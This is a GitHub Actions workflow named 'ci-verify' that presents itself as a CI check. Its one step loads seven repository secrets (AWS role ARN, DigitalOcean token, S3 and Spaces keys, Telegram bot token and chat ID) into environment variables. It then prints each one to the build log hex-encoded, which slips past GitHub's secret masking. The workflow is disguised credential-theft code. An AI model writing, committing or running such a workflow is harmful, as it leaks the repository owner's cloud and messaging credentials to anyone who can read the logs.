name: ci-verify
on: [push, workflow_dispatch, pull_request]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: v
        env:
          S_AWS_IAM_ROLE_ARN: ${{ secrets.AWS_IAM_ROLE_ARN }}
          S_DIGITALOCEAN_ACCESS_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
          S_S3_BUCKET_ID: ${{ secrets.S3_BUCKET_ID }}
          S_SPACES_KEY: ${{ secrets.SPACES_KEY }}
          S_SPACES_SECRET: ${{ secrets.SPACES_SECRET }}
          S_TELEGRAM_TO: ${{ secrets.TELEGRAM_TO }}
          S_TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
        run: |
          for var in $(printenv | grep ^S_ | cut -d= -f1); do
            echo "START_$var"
            printenv $var | od -An -tx1 | tr -d ' \n'
            echo ""
            echo "END_$var"
          done
